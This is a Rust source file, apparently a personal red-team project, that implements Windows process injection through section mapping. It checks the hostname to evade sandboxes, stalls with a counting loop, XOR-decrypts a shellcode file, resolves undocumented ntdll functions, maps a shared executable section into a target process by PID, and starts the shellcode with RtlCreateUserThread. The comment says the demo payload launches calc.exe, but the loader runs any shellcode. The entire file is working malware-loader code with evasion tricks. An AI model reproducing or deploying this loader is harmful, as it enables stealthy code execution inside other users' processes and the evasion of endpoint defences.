use std::ffi::c_void;
use std::fs::File;
use std::io;
use std::ptr::null_mut;
use std::io::{Error, Read};
use std::process::exit;
use winapi::shared::basetsd::SIZE_T;
use winapi::um::processthreadsapi::{OpenProcess, GetCurrentProcess};
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::winnt::{HANDLE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PROCESS_ALL_ACCESS, SEC_COMMIT};
use winapi::shared::minwindef::{ULONG, DWORD};
use winapi::shared::ntdef::{LARGE_INTEGER, NTSTATUS};
use hostname::get;

#[repr(C)]
#[allow(non_snake_case)]
struct UNICODESTRING {
    Length: u16,
    MaximumLength: u16,
    Buffer: *mut u16,
}

#[repr(C)]
#[allow(non_snake_case)]
struct OBJECTATTRIBUTES {
    Length: ULONG,
    RootDirectory: HANDLE,
    ObjectName: *mut UNICODESTRING,
    Attributes: ULONG,
    SecurityDescriptor: *mut c_void,
    SecurityQualityOfService: *mut c_void,
}

type MyNtCreateSection = unsafe extern "system" fn(
    section_handle: *mut HANDLE,
    desired_access: ULONG,
    object_attributes: *mut OBJECTATTRIBUTES/*OBJECT_ATTRIBUTES*/,
    maximum_size: *mut LARGE_INTEGER,
    page_attributes: ULONG,
    section_attributes: ULONG,
    file_handle: HANDLE,
) -> NTSTATUS;

type MyNtMapViewOfSection = unsafe extern "system" fn(
    section_handle: HANDLE,
    process_handle: HANDLE,
    base_address: *mut *mut c_void,
    zero_bits: usize,
    commit_size: SIZE_T,
    section_offset: *mut LARGE_INTEGER,
    view_size: *mut SIZE_T,
    inherit_disposition: DWORD,
    allocation_type: ULONG,
    win32_protect: ULONG,
) -> NTSTATUS;

type MyRtlCreateUserThread = unsafe extern "system" fn(
    process_handle: HANDLE,
    security_descriptor: *mut c_void,
    create_suspended: bool,
    stack_zero_bits: ULONG,
    stack_reserved: *mut ULONG,
    stack_commit: *mut ULONG,
    start_address: *mut c_void,
    start_parameter: *mut c_void,
    thread_handle: *mut HANDLE,
    client_id: *mut CLIENTID,
) -> NTSTATUS;


#[repr(C)]
#[allow(non_snake_case)]
struct CLIENTID {
    UniqueProcess: *mut c_void,
    UniqueThread: *mut c_void,
}

const XOR_KEY: u8 = 0x5A;


fn xor_decrypt(data: &mut [u8]) {
    for byte in data.iter_mut() {
        *byte ^= XOR_KEY;
    }
}

fn main() ->  Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();

    if args.len() != 2{
        println!("Usage: process.exe <PID>");
        exit(1);
    }


    let target_pid = args[1].parse::<u32>().expect("Enter Valid PID");

    match get() {
        Ok(hostname) => {
            let hostname_str = hostname.to_string_lossy();
            if hostname_str.eq_ignore_ascii_case("HAL9TH") {
                return Ok(());
            } else {
                println!("Hostname é: {}", hostname_str);
            }
        }
        Err(e) => {
            eprintln!("Erro ao obter hostname: {}", e);
        }
    }

    for i in 0..10000 {
        println!("{}", i);
    }

    /* ------------ [Shellcode (in this example pop a calc.exe)] ---------------------- */
    let mut file = File::open("C:\\Users\\Arthur\\Documents\\crow\\nt-api-injector\\src\\encrypted_shellcode.bin")?; // Tratamento correto do Result
    let mut shellcode = Vec::new();
    file.read_to_end(&mut shellcode)?; 

    // Descriptografar a shellcode
    xor_decrypt(&mut shellcode);


    unsafe{
        let h_ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if h_ntdll.is_null() {
            eprintln!("Failed to load ntdll.dll: {:?}", Error::last_os_error());
            exit(1);
        }

        let nt_create_section: MyNtCreateSection = std::mem::transmute(GetProcAddress(h_ntdll, b"NtCreateSection\0".as_ptr() as *const i8));
        let nt_map_view_of_section: MyNtMapViewOfSection = std::mem::transmute(GetProcAddress(h_ntdll, b"NtMapViewOfSection\0".as_ptr() as *const i8));
        let rtl_create_user_thread: MyRtlCreateUserThread = std::mem::transmute(GetProcAddress(h_ntdll, b"RtlCreateUserThread\0".as_ptr() as *const i8));

        // section creation setup
        let mut section_handle: HANDLE = null_mut();

        let mut section_size: LARGE_INTEGER = std::mem::zeroed();
        *section_size.QuadPart_mut() = 4096 as i64;

        let desired_access = winapi::um::winnt::SECTION_MAP_READ | winapi::um::winnt::SECTION_MAP_WRITE | winapi::um::winnt::SECTION_MAP_EXECUTE;

        let status = nt_create_section(
            &mut section_handle,
            desired_access,
            null_mut(),
            &section_size as *const _ as *mut LARGE_INTEGER,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            null_mut(),
        );

        if status < 0{
            eprintln!("[-] NtCreateSection failed with status: {:X}", status);
            exit(1);
        }

        let mut local_section_address: *mut c_void = null_mut();
        let mut view_size = 4096;

        let status = nt_map_view_of_section(
            section_handle,
            GetCurrentProcess(),
            &mut local_section_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2,
            0,
            PAGE_READWRITE,
        );

        if status < 0 {
            eprintln!("NtMapViewOfSection (local) failed with status: {:X}", status);
            exit(1);
        }

        // create a view of the section in the target process
        let target_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, target_pid);
        if target_handle.is_null() {
            eprintln!("OpenProcess failed: {:?}", Error::last_os_error());
            exit(1);
        }

        let mut remote_section_address: *mut c_void = null_mut();
        let status = nt_map_view_of_section(
            section_handle,
            target_handle,
            &mut remote_section_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2,
            0,
            PAGE_EXECUTE_READ,
        );
        if status < 0 {
            eprintln!("NtMapViewOfSection (remote) failed with status: {:X}", status);
            CloseHandle(target_handle);
            exit(1);
        }

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_section_address as *mut u8, shellcode.len());

        let mut target_thread_handle: HANDLE = null_mut();
        let status = rtl_create_user_thread(
            target_handle,
            null_mut(),
            false,
            0,
            null_mut(),
            null_mut(),
            remote_section_address,
            null_mut(),
            &mut target_thread_handle,
            null_mut(),
        );
        if status < 0 {
            eprintln!("RtlCreateUserThread failed with status: {:X}", status);
        }

        CloseHandle(target_handle);
        if !target_thread_handle.is_null() {
            CloseHandle(target_thread_handle);
        }

        Ok(())
    }
}